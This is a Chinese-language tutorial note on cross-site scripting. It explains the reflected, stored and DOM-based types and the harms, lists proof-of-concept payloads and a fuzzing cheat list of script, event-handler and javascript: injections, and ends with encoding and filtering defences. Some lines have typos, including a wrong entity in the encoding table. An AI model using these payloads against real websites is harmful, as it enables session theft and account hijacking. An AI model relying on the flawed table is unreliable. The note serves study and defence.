# XSS跨站脚本攻击

## 漏洞原理

Cross-Site Scripting (跨站脚本攻击)简称XSS

攻击者**输入**恶意的js代码，由于开发未对输入进行**过滤**，未在数据输出时进行**转义**，导致恶意js代码在客户端上**执行**。

xss分类:
两类:持久型和非持久型
三类:反射型、存储型、DOM型

- 反射型 XSS，恶意脚本来自当前的 HTTP 请求。
- 存储型 XSS，恶意脚本来自网站的数据库。
- 基于 DOM 的 XSS，漏洞存在于客户端代码中，而不是服务器端代码中。

## 漏洞危害

利用跨站点脚本漏洞的攻击者通常能够：

- 冒充或伪装成受害用户。
- 执行用户能够执行的任何操作。
- 读取用户能够访问的任何数据。
- 捕获用户的登录凭据。
- 对网站进行虚拟污损。
- 将木马功能注入网站。

信息窃取:用户凭证、用户账号密码
键盘记录
网络钓鱼
用户劫持
网页挂马
暗链
xss ddos
xss蠕虫

## 漏洞利用

### 反射型XSS

是最简单的跨站点脚本。当应用程序在 HTTP 请求中接收数据并以不安全的方式在即时响应中包含该数据时，就会出现这种情况。

```
<script>alert(1111)</script>
```

```
name=<img src=1 onerror=alert(1)>
```

### 存储型XSS

1.攻击者将恶意代码提交到目标网站的数据库中。
2.受害者打开目标网站时，网站服务端将恶意代码从数据库取出，拼接在HTML中返回给浏览器。
3.受害者浏览器接收到响应后解析执行，混在其中的恶意代码也被执行。
4.恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作。

```
hi"><script>alert(document.cookie)</script>
```

```
<input onfocus=alert("好好学习，天天向上!") autofocus>
```

### DOM型XSS

文档对象模型 (DOM) 是 Web 浏览器对页面元素的分层表示。网站可以使用 JavaScript 来操作 DOM 的节点和对象以及它们的属性。DOM 操作本身不是问题。但是，不安全地处理数据的 JavaScript 可能会引发各种攻击。当网站包含采用攻击者可控值（称为源）并将其传递到危险函数（称为接收器）的 JavaScript 时，就会出现基于 DOM 的漏洞

以下是可用于利用各种DOM漏洞的典型来源：

```
document.URL 
document.documentURI 
document.URLUnencoded 
document.baseURI 
location 
document.cookie 
document.referrer 
window.name 
history.pushState 
history.replaceState 
localStorage 
sessionStorage 
IndexedDB (mozIndexedDB, webkitIndexedDB, msIndexedDB) 
Database
```

```
'onclick="alert(123)">
```

### XSS模糊测试

xss备忘清单https://portswigger.net/web-security/cross-site-scripting/cheat-sheet

```
<script>alert(8888 )</script> 
<img src=1 onerror=alert(1)>
<script>confirm(8888)</script>
<script>prompt(8888)</script>
<anytag onmouseover=alert(1)>h 
<anytag onc Lick=alert(2)>h
<a onmouseover=alert(3)>h
<a onclick=alert(4)>h
<a href=javascript:alert(5)>h
<button/onclick=alert(6)>h
sform onsubmit=alert(10)><button>h
<img src=x onerror=alert(11)> 29
<meta http-equiv="refresh" content="0;
url=data:text/html,<script>alert(15)</script>">

```

### XSS防御方法

#### 代码实例：

String encodedContent = ESAPI.encoder().encodeForHTML(request.getParameter("inut');

```
<input type="text" value="<%= getParameter("keyword") %>">
<button>搜索</button>
<div>
您搜索的关键词是: <%=getParameter ("keyword") %>
</div>
```

构造链接: 

```
http://xxx/search?keyword="><script>alert('xss');</script>
```

返回代码

```
<input type="text" value=""><script>alert('XSS') ;</script>">
<button>搜索</button>
<div>
您搜索的关键词是: "><script>alert('XSS');</script>
</div>
```

#### 防御方法：

escapeHTML()：HTML实体编码

```
<	&it;
>	&gt;
"	&quot;
'	&#x27;
&	&amp;
/	&#x2F
```

```
<input type="text "
value=" &quot;&gt;&lt;script&gt;alert(&#x27;XSS&#x27;);&lt;&#x2F;script&gt;">
<button>搜索</button>
<div>
您搜索的关键词是: &quot;&gt;&lt;script&gt;alert(&#x27;XSS&#x27;);&1t;&#x2F;script&gt;
</div>
```

输入过滤，黑名单，过滤尖括号，单双引号#号

输出转义

针对于复杂文本，首先是过滤，使用白名单的方式，只允许用户输入简单标签，然后对于难以处理的标签进行转义编码，过滤或者编码之后，再把处理过后的数据放到<p>标签或者<div>标签等安全的HTML标签进行输出

添加httponly参数

